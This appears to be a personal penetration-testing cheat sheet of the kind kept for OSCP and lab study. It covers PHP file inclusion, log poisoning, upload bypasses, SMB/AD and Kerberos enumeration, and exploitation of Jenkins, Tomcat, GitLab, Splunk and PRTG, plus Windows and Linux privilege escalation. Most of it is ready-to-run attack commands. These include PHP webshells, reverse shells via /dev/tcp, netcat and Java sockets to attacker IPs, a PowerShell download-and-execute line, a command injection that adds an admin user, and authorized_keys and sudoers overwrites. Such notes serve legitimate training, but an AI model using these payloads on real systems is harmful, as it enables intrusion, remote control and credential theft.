# encode php code
echo '<?php system($_GET["cmd"]); ?>' | base64
# urlencode the encoded code
index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### Input Wrapper
```bash
# Need to check "allow_url_include" is on just like data wrapper

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"

# if the function only accepts POST
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"

```

### Expect Wrapper
```bash
# check if we can exploit expect wrapper by investigating php config file
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

======================= Remote File Inclusion =====================================

## Remote File Inclusion
```bash
# first start by trying to include a local URL
/index.php?language=http://127.0.0.1:80/index.php

echo '<?php system($_GET["cmd"]); ?>' > shell.php
index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# FTP protocol
sudo python -m pyftpdlib -p 21
index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# SMB protocol
impacket-smbserver -smb2support share $(pwd)
index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

======================= log poisoning =============================================

### PHP Session Poisoning
PHPSESSID from inspect->storage->cookies

```bash
# session files location
/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
C:\Windows\Temp\sess_el4ukv0kqbvoirg7nkp4dncpk3

# check if we can reach file
index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

# poison the log with url encoded php code
index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# check if we can run the code
index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Server Log Poisoning
```bash
# Apache logs location
/var/log/apache2/access.log
C:\xampp\apache\logs\access.log

# nginx logs location
/var/log/nginx/
C:\nginx\log\

# files on /proc directory(The User-Agent header is also shown on process files under the Linux /proc/ directory)
/proc/self/environ
/proc/self/fd/N files (where N is a PID usually between 0-50)

# etc
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log

# posioning with curl
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

======================= Automated scanning =================================================

### Fuzzing Parameters
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### Check LFI vulnerability with LFI wordlists
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

### Server Webroot
```bash
# common webroot paths wordlists
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

# fuzzing with index.php file
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### Server Logs/Configurations(identify the correct logs directory to be able to perform the log poisoning attacks)
```bash
# common server logs and configuration paths wordlists
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

# /etc/apache2/apache2.conf
# /etc/apache2/envvars
```


## Local File Inclusion
- Make sure to check "important files" list
- Make sure to see what files we can find using wfuzz on our current location
  - Make sure to check file extension(.py, .js, .conf, .config...)
- /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
- Files to check on linux
  - ![image](https://github.com/nuricheun/OSCP/assets/14031269/6f634499-c15a-4424-adae-df9013031d02)

```bash
# Local File Inclusion...
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py

# First run without -fl
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ -fl 5
```

## File Upload Exploit

### Upload the same file twice to see what happens
If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server.
If the web application displays an error message, this can reveal programming language or web technologies in use.

### Executable Files
```bash
# Bypass .php filter
.phps, .php7, .phtml, .pHP, .PHP, .PHp,...

# See if we can upload .htaccess file
echo "AddType application/x-httpd-php .xxx" > htaccess
```

### Crafting Malicious Image
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# when exeuciting
/index.php?language=./profile_images/shell.gif&cmd=id
```

### Crafting Malicious Zip file
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# when exeuciting
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Crafting Malicious Phar
```bash
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering(); ?>

# compile
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# execute
index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Non-Executable Files
```bash
# Change filename to overwrite authorized_keys file
## generate ssh key and write a file that has its public key
ssh-keygen
fileup
cat fileup.pub > authorized_keys

## overwrite authorized_keys file
../../../../../../../root/.ssh/authorized_keys

## check if we can login
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com

```

## Command Injection
```bash
# ; to add another command
git%3Bipconfig

# &&

```


# Password Attacks
- What is the password encoded with?
  - base64?

```bash
pdf2john Infrastructure.pdf > pdf.txt
```

```bash
hydra -e nsr -L users.txt -P users.txt 192.168.X.X ftp
```

```bash
echo -n 'tacos123' | md5sum
echo -n 'tacos123' | sha1sum
echo -n 'tacos123' | sha256sum 
```

# nfs 
```bash
# footprinting with nmap
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

# showmount
showmount -e 10.129.14.128

# mount nfs
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

# unmount
sudo umount ./target-NFS
```


# SMB
```bash
==================================================================================================

# samba configuration file
cat /etc/samba/smb.conf | grep -v "#\|\;"

# restart samba
sudo systemctl restart smbd

==================================================================================================

# footprinting with nmap
nmap 10.10.10.175 --script=smb-enum* -p445
sudo nmap 10.129.14.128 -sV -sC -p139,445

==================================================================================================

# smbclient
## Even when it says the user can only read, TRY uploading something anyway!
## anon
smbclient -L 10.10.10.175 -N
smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"
!ls
!cat prep-prod.txt

> recurse on
> prompt off
> ls

==================================================================================================

# rpcclient
rpcclient -U "" 10.129.14.128

## Server information.
srvinfo

## Enumerate all domains that are deployed in the network.
enumdomains

## Provides domain, server, and user information of deployed domains.
querydominfo

## Enumerates all available shares.
netshareenumall

## Provides information about a specific share.
netsharegetinfo <share>

## Enumerates all domain users.
enumdomusers

## Enumerates all domain groups.
enumdomgroups

## Provides information about a specific user.
queryuser <RID>

## Brute Forcing User RIDs (alternative is impacket-samrdump)
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

==================================================================================================

# Impacket - Samrdump.py
samrdump.py 10.129.14.128

==================================================================================================

#crackmapexec(smb/winrm)
crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local

==================================================================================================

# smbmap
smbmap -H 10.10.10.161
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -u 'guest' -p ''
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5

==================================================================================================

# Enum4Linux-ng

## installation
mightyllama@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
mightyllama@htb[/htb]$ cd enum4linux-ng
mightyllama@htb[/htb]$ pip3 install -r requirements.txt

## Enumeration
./enum4linux-ng.py 10.129.14.128 -A

==================================================================================================

# bloodhound : after discovering valid user credentials and we can't winrm...! so useful
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all

==================================================================================================

# dns
dig @10.10.10.161 AXFR htb.local
dnsenum 192.168.162.122

==================================================================================================

# enum4linux
enum4linux -a -u "" -p "" dc-ip
enum4linux -a -u "guest" -p "" dc-ip

==================================================================================================

# LDAP
## anon
ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"

==================================================================================================

# kerbrute
## anon
./kerbrute userenum -d heist.offsec --dc 192.168.243.165 /PATH/TO/FILE/<USERNAMES>

==================================================================================================

# GetADUsers
impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192

==================================================================================================

# GetNPUsers.py(18200)
- without providing anything.
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
GetNPUsers.py active.htb/ -dc-ip 10.10.10.100


- with potential usernames.txt
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

- with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/dave -no-pass
impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>

- with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (#this requires pete's password for us to be able to get dave's TGT)

### with username list
impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

# Kerberoast(requires valid credentials) 13100
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

# FTP
```bash
# Download everything
mget *

# vsFTPd Config File
cat /etc/vsftpd.conf

# Interact with the FTP service on the target.
ftp <FQDN/IP>

# Interact with the FTP service on the target.
nc -nv <FQDN/IP> 21

# Interact with the FTP service on the target.
telnet <FQDN/IP> 21

# Interact with the FTP service on the target using encrypted connection.
openssl s_client -connect <FQDN/IP>:21 -starttls ftp

# Download all available files on the target FTP server.
wget -m --no-passive ftp://anonymous:anonymous@<target>

# debug/trace mode on
debug
trace

# Recursive Listing
ls -R

```

# Jenkins
```bash
# On linux, let's run id
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# On linux, gain reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# On Windows using powershell script
cmd = """powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.x.x/rev.ps1')"""
println cmd.execute().text


# On windows using java reverse shell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Miscellaneous Vulnerabilities
Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.

Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
```

# Joomla
```bash
# robots.txt
curl -s http://dev.inlanefreight.local/robots.txt | head -n 5

# README.txt
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

#  fingerprint the version from JavaScript files in the media/system/js/ directory
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

# droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/

# The default administrator account on Joomla installs is admin
admin:

# login bruteforce
python3 ./joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

# Drupal
```bash
# enum - check CHANGELOG.txt or README.exe, robots.txt, /node
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

# enum - droppescan
droopescan scan drupal -u http://drupal.inlanefreight.local

# ATTACK - Leveraging the PHP Filter Module(before version 8)
click modules
check "PHP filter" and git "Save configuration"
Next, we could go to Content --> Add content and create a Basic page
Make sure to select "PHP code"
## check if it works with curl
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

# ATTACK 2 -Leveraging the PHP Filter Module(after version 8)
## Download filter on attack machine
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
# Once downloaded go to Administration > Reports > Available updates
drupal-qa.inlanefreight.local/admin/reports/updates/install
# 
```

# Splunk
![image](https://github.com/nuricheun/OSCP/assets/14031269/2cbdb5c9-768b-412e-ac7a-f6492679a9be)

```bash
# Abusing Built-In Functionality
1. clone this repo https://github.com/0xjpuff/reverse_shell_splunk
git clone https://github.com/0xjpuff/reverse_shell_splunk
2. The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell)
change the attacker's ip and port number
3. compress 
tar -cvzf updater.tar.gz splunk_shell/
3. The next step is to choose Install app from file and upload the application(check the image above)
4. Run netcat
sudo nc -lnvp 443
5. On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
```

# PRTG Network Monitor
```bash
# version enum
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

# Leveraging Known Vulnerabilities
1. To begin, mouse over Setup in the top right and then the Account Settings menu and finally click on Notifications
2. Add new notification.
3. Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM.
4. Under Program File, select Demo exe notification - outfile.ps1 from the drop-down.
5. Finally, in the parameter field, enter a command
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
6. Save
7. Click the Test button to run our notification and execute the command to add a local admin user
8. Check if new user has been created
crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

# Wordpress
```bash
# wordpress version
curl -s http://blog.inlanefreight.local | grep WordPress

# themes
curl -s http://blog.inlanefreight.local/ | grep themes

# plugins
curl -s http://blog.inlanefreight.local/ | grep plugins

# wpscan
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

# user enum
wpscan --url http://blog.inlanefreight.local --enumerate u

# login brute force
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

# Vulnerable Plugins - mail-masta
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

# Vulnerable Plugins - wpDiscuz
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

# Tomcat CGI
```bash
# default directory for CGI scripts is /cgi
# http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

# execute whoami.exe
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

```


# Gitlab
```bash
# version enum
The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in

# See if there's anything public
We should first go to /explore

# Username enumeration
git clone https://github.com/dpgg101/GitLabUserEnum
python3 ./gitlab_user_enum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist --wordlist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# Authenticated RCE
mightyllama@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

# Tomcat
```bash
# version enum - if we're trying to reach invalid page, we can get the version information!
http://app-dev.inlanefreight.local:8080/invalid
# or check docs page
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

# enumeration - check /manager or /host-manager pages && bruteforce
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

# useful default credentials
tomcat:tomcat, admin:admin

# Tomcat Manager - WAR File Upload
1. download jsp webshell and create war file
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
2. Click on Browse to select the .war file and then click on Deploy
3. This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
http://web01.inlanefreight.local:8180/backup/cmd.jsp

# Tomcat Manager - WAR File Upload 2
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.29 LPORT=443 -f war > backup.war

# CVE-2020-1938 : Ghostcat (https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
# This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat.
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

# Active Directory
## Enumeration
```bash

sudo -E wireshark
sudo tcpdump -i ens224
sudo responder -I ens224 -A 


# fping
fping -asgq 172.16.5.0/23
```


## Important Security Groups And Exploit
**Backup Operators**
```bash


```

**Account Operators**
```bash
# Users in this group can create or modify other accounts in the domain
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

**Server Operators**
```bash
Users can administer Domain Controllers. They cannot change any administrative group memberships.
```

# Windows Lateral Movement
## When we have AD credentials but we don't have a machine we can use that credentials
- Use runas
```bash
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```



# Windows Privilege Escalation

## Manual Enumeration
```bash
#User information&hostname
whoami
whoami /priv
whoami /groups
whoami /all
net user attacker | find "Local Group"
  -> If user is a member of administrators maybe UACME will be required

#Existing users and groups
net user
  Get-LocalUser
net localgroup
  Get-LocalGroup
net localgroup adminteam
  Get-LocalGroupMember adminteam

#System information
systeminfo

#IP
ipconfig /all

#Routing table
route print

#Active network
netstat -ano

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# cmdkey /list

#Installed Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Installed Applications inside of Program Files
C:\Program Files\...
=============================================== Common Program Files ====================================================
02/16/2021  10:27 PM    <DIR>          .
02/16/2021  10:27 PM    <DIR>          ..
11/04/2020  04:08 AM    <DIR>          Common Files
11/03/2020  08:34 PM    <DIR>          internet explorer
11/03/2020  09:37 PM    <DIR>          MSBuild
11/03/2020  09:37 PM    <DIR>          Reference Assemblies
02/16/2021  10:27 PM    <DIR>          VMware
12/08/2020  07:22 PM    <DIR>          Windows Defender
12/08/2020  07:22 PM    <DIR>          Windows Defender Advanced Threat Protection
09/14/2018  11:19 PM    <DIR>          Windows Mail
11/03/2020  08:34 PM    <DIR>          Windows Media Player
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform
09/14/2018  11:28 PM    <DIR>          windows nt
11/03/2020  08:34 PM    <DIR>          Windows Photo Viewer
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices
09/14/2018  11:19 PM    <DIR>          Windows Security
09/14/2018  11:19 PM    <DIR>          WindowsPowerShell

C:\Program Files (x86)\...
=============================================== Common Program Files (x86) ====================================================
11/03/2020  09:37 PM    <DIR>          .
11/03/2020  09:37 PM    <DIR>          ..
09/14/2018  11:28 PM    <DIR>          Common Files
11/03/2020  08:34 PM    <DIR>          Internet Explorer
09/14/2018  11:19 PM    <DIR>          Microsoft.NET
11/03/2020  09:37 PM    <DIR>          MSBuild
11/03/2020  09:37 PM    <DIR>          Reference Assemblies
12/08/2020  07:22 PM    <DIR>          Windows Defender
09/14/2018  11:19 PM    <DIR>          Windows Mail
11/03/2020  08:34 PM    <DIR>          Windows Media Player
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform
09/14/2018  11:28 PM    <DIR>          windows nt
11/03/2020  08:34 PM    <DIR>          Windows Photo Viewer
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices
09/14/2018  11:19 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              15 Dir(s)  11,086,475,264 bytes free


#Running processes
Get-Process

#Juicy files
Get-ChildItem -Path C:\ -Include *.kdbx,*.htpasswd -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig,*.config -File -Recurse -ErrorAction SilentlyContinue
Check every user's directory && desktop && documents && downloads

dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath
  type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Public\Transcript...
```

## Service Binary Hijacking
```bash

# Get a list of all installed windows services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
sc query | findstr /i servname

# Check StartMode
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
sc qc servicename

# Search for Modifiable services/executables with PowerUP.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile

icacls "C:\xampp\apache\bin\httpd.exe"

#restart service
net stop service && net start service
Restart-Service service

#When we can't restart the service but we have seshutdown privilege
shutdown /r /t 0

```

## Service DLL Hijacking
```bash
```

## Scheduled Tasks
```bash
# Scheduled tasks: Check Process || query schtasks
Get-ScheduledTask
schtasks /query /fo LIST /v
Get-Process
  Focus on Last Run Time, Next Run Time, Run As User Task To Run
  Check executable path with icacls to see if we can replace the exe file

# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

```

## Unquoted Service Paths
```bash
```

# Linux Privilege Escalation
## Linux Manual Enumeration

```bash
# User context
id
hostname

# Search for flags
find / -type f -name 'local.txt' 2>/dev/null
find / -type f -name 'proof.txt' 2>/dev/null

# Check User files(Everyone if you can)
cat /home/user/.bash_aliases
cat /home/user/.bash_history

# Check config files
/var/www/html/sites/default/config.php

# Enumerate other userse(This is really important because we might have to pivot to other users)
cat /etc/passwd

# Operating system release and version
cat /etc/issue
cat /etc/os-release

# Kernel version and architecture
uname -a

# Running process
ps aux
ps auxwww

# Network interface
ip a

# Route
routel

# Active network connections
ss -anp

# Firewall rule
cat /etc/iptables/rules.v4

# Cronjob
ls -lah /etc/cron*
cat /etc/crontab
crontab -l

# Installed applications
dpkg -l

# Every directory writable by the current user
find / -writable -type d 2>/dev/null

# SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

# List all mounted filesystems
mount

# List all drives that will be mounted at boot time
cat /etc/fstab

# List all available disks
lsblk
```

## Linux Privilege Strategy
- Run linpeas and check every file that's red
- Run pspy to see if we're missing anything
- When current user can't use wget that probably means we need to pivot as someone else
- See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
- If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
- Check what's running on local port
- Check suggested conf, config files from linpeas
- Check what's on /opt directory
- Check mail in /var/mail /var/spool/mail

## Common Linux Privilege Escalation

### Exploit tar with wilrdcard
```bash
echo "/bin/bash -c '-i >& /dev/tcp/192.168.45.175/80 0>&1" > shell.sh
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=bash shell.sh"
```

### Edit /etc/sudoers
```bash
exec_command(‘echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers’)
```

### Exploit 7z with wildcard && check error messages
```bash
touch @enox.zip
ln -s /root/secret enox.zip
```
